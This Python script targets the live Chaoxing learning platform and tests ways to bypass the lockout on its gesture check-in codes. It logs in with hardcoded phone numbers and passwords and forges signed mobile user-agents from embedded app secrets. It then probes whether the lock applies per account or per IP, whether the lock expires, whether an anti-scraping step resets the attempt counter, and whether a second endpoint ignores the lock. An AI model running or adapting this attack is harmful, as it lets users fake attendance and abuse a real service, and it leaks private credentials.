#!/usr/bin/env python3
"""
手势签到 Step8: 锁定绕过三大假设测试
1. 锁定范围: 教师账号(不同uid同IP)在锁定活动B上 → per-uid还是per-IP?
2. 锁定TTL: 活动C(约10分钟前锁定)是否仍锁
3. analysis流程重置计数器: 活动A(计数3/5)上 analysis→错→analysis→错
"""
import base64, hashlib, json, uuid, requests, urllib3, re, time
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

urllib3.disable_warnings()

AES_KEY = b"u2oh6Vu^HWe4_AES"
SCHILD_SALT = "ipL$TkeiEmfy1gTXb2XHrdLN0a@7c^vu"
LOGIN_URL = "https://passport2.chaoxing.com/fanyalogin"
BASE = "https://mobilelearn.chaoxing.com"

def aes_enc(p):
    c = AES.new(AES_KEY, AES.MODE_CBC, AES_KEY)
    return base64.b64encode(c.encrypt(pad(p.encode(), AES.block_size))).decode()

def schild_sign(model, locale, version, build, imei):
    parts = [f"(schild:{SCHILD_SALT})", f"(device:{model})", f"Language/{locale}",
             f"com.chaoxing.mobile/ChaoXingStudy_3_{version}_android_phone_{build}",
             f"(@Kalimdor)_{imei}"]
    return hashlib.md5(" ".join(parts).encode()).hexdigest()

def get_mobile_ua():
    imei = uuid.uuid4().hex[:32]
    sc = schild_sign("MI10", "zh_CN", "6.7.2", "10941_314", imei)
    return (f"Mozilla/5.0 (Linux; Android 16; MI10 Build/OPM1.171019.019; wv) "
            f"AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.99 Mobile Safari/537.36 "
            f"(schild:{sc}) (device:MI10) Language/zh_CN "
            f"com.chaoxing.mobile/ChaoXingStudy_3_6.7.2_android_phone_10941_314 "
            f"(@Kalimdor)_{imei}")

def login(phone, pwd):
    s = requests.Session()
    s.verify = False
    ua = get_mobile_ua()
    s.headers.update({"User-Agent": ua, "Accept": "application/json, text/plain, */*", "Accept-Language": "zh_CN"})
    s.post(LOGIN_URL, data={"fid": "-1", "uname": aes_enc(phone), "password": aes_enc(pwd),
                            "refer": "http%3A%2F%2Fi.mooc.chaoxing.com", "t": "true",
                            "forbidotherlogin": "0", "validate": "", "doubleFactorLogin": "0",
                            "independentId": "0", "independentNameId": "0"},
           allow_redirects=False, timeout=30)
    puid = ""
    for c in s.cookies:
        if c.name in ("UID", "_uid"):
            puid = c.value
    try: s.get("https://i.chaoxing.com/base", timeout=20, allow_redirects=True)
    except: pass
    return s, puid

AJAX_HDR = {"Referer": "https://mobilelearn.chaoxing.com/", "X-Requested-With": "XMLHttpRequest"}

s_s, puid_s = login("18436633997", "3.1415926Cpy")
s_t, puid_t = login("19712720708", "3.1415926Cpy")
print(f"学生puid={puid_s}, 教师puid={puid_t}")

AID_A = "5000173244801"  # 计数3/5
AID_B = "5000173244790"  # 已锁定
AID_C = "5000173244649"  # 已锁定(约10分钟前)

def check_code(s, aid, code):
    r = s.get(f"{BASE}/widget/sign/pcStuSignController/checkSignCode",
              params={"activeId": aid, "signCode": code}, headers=AJAX_HDR, timeout=15)
    try:
        return r.json()
    except:
        return {"raw": r.text[:150]}

# ============ 1. 锁定范围测试 ============
print("\n[1] 锁定范围测试 — 教师账号(不同uid同IP)在锁定的活动B上:")
resp = check_code(s_t, AID_B, "987654321")
print(f"  教师checkSignCode: {json.dumps(resp, ensure_ascii=False)[:150]}")
resp2 = check_code(s_s, AID_B, "987654322")
print(f"  学生checkSignCode(对照): {json.dumps(resp2, ensure_ascii=False)[:150]}")

# ============ 2. 锁定TTL测试 ============
print(f"\n[2] 锁定TTL测试 — 活动C(约10分钟前锁定):")
resp = check_code(s_s, AID_C, "987654323")
print(f"  学生checkSignCode: {json.dumps(resp, ensure_ascii=False)[:150]}")

# ============ 3. analysis流程重置计数器测试 ============
print(f"\n[3] analysis重置测试 — 活动A(当前计数3/5):")

def analysis_flow(s, aid):
    """Doraemon的analysis反爬流程"""
    r1 = s.get(f"{BASE}/pptSign/analysis",
               params={"DB_STRATEGY": "RANDOM", "aid": aid, "vs": "1"}, timeout=15)
    m = re.search(r"code='\+(\d+)'", r1.text)
    if not m:
        m = re.search(r"code='(\d+)'", r1.text)
    code = m.group(1) if m else ""
    if code:
        r2 = s.get(f"{BASE}/pptSign/analysis2",
                   params={"DB_STRATEGY": "RANDOM", "code": code}, timeout=15)
        return code, r2.status_code
    return None, r1.status_code

code, st = analysis_flow(s_s, AID_A)
print(f"  analysis: code={code} status={st}")

resp = check_code(s_s, AID_A, "111222")
print(f"  第4次错误(111222): {json.dumps(resp, ensure_ascii=False)[:120]}")

code, st = analysis_flow(s_s, AID_A)
print(f"  再次analysis: code={code} status={st}")

resp = check_code(s_s, AID_A, "222333")
msg = json.dumps(resp, ensure_ascii=False)[:120]
print(f"  第5次错误(222333): {msg}")
if "锁定" in msg:
    print("  *** analysis不重置计数器, 活动A已锁定 ***")
elif "手势不正确" in msg:
    print("  *** analysis重置了计数器! 绕过方式找到! ***")

# ============ 4. Doraemon的pcStuSignController/signIn端点 ============
print(f"\n[4] pcStuSignController/signIn端点测试（在已锁定的B上 — 观察是否读锁）:")
r = s_s.get(f"{BASE}/widget/sign/pcStuSignController/signIn",
            params={"courseId": "257485372", "classId": "132821141",
                    "activeId": AID_B, "signCode": "123456", "validate": ""},
            headers=AJAX_HDR, timeout=15)
print(f"  HTTP {r.status_code}: {r.text[:200]}")

# 在活动A上也测一次（若A未锁）
r = s_s.get(f"{BASE}/widget/sign/pcStuSignController/signIn",
            params={"courseId": "257485372", "classId": "132821141",
                    "activeId": AID_A, "signCode": "333444", "validate": ""},
            headers=AJAX_HDR, timeout=15)
print(f"  活动A: HTTP {r.status_code}: {r.text[:200]}")
